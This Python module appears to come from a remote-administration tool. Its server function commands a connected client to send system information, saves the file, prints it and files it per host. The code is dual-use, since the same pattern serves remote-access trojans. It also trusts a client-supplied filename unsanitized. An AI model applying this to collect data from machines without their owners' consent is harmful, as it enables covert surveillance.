from datetime import datetime
import time
from termcolor import colored
import socket
import ntpath
import os
import shutil


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


def system_information(con, ttl, root, tmp_availables, clients):
    d = datetime.now().replace(microsecond=0)
    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
    print(f"[{colored('*', 'magenta')}]Retrieving remote station's system information\n"
          f"[{colored('*', 'magenta')}]Please wait...")

    # Send Systeminfo command to client
    con.send('si'.encode())

    # Get systeminfo filename
    filenameRecv = con.recv(1024)
    time.sleep(ttl)

    # Get file size in bytes
    size = con.recv(4)

    # Convert size to number
    size = bytes_to_number(size)

    # Init current size & buffer
    current_size = 0
    buffer = b""
    filenameRecv = str(filenameRecv).strip("b'")

    # Create a directory with host's name if not already exists.
    for item in tmp_availables:
        for conKey, ipValue in clients.items():
            for ipKey in ipValue.keys():
                if item[1] == ipKey:
                    ipval = item[1]
                    host = item[2]
                    user = item[3]
                    path = os.path.join(root, host)
                    try:
                        os.makedirs(path)

                    except FileExistsError:
                        pass

    try:
        with open(filenameRecv, 'wb') as file:
            while current_size < size:
                data = con.recv(1024)
                if not data:
                    break

                if len(data) + current_size > size:
                    data = data[:size - current_size]

                buffer += data
                current_size += len(data)
                file.write(data)

    except socket.error as e:
        print(f"[{colored('*', 'red')}]{e}\n")
        return False

    except (ConnectionResetError, ConnectionError,
            ConnectionRefusedError, ConnectionAbortedError) as c:
        print(f"[{colored('*', 'red')}]{c}\n")
        return False

    name = ntpath.basename(str(filenameRecv))

    with open(filenameRecv, 'r') as file:
        data = file.read()
        print(data)

    print(f"[{colored('V', 'green')}]Received: {name} \n")
    con.send(f"Received file: {name}\n".encode())
    msg = con.recv(1024).decode()

    # Move screenshot file to directory
    src = os.path.abspath(filenameRecv)
    dst = fr"{path}"
    shutil.move(src, dst)

    return
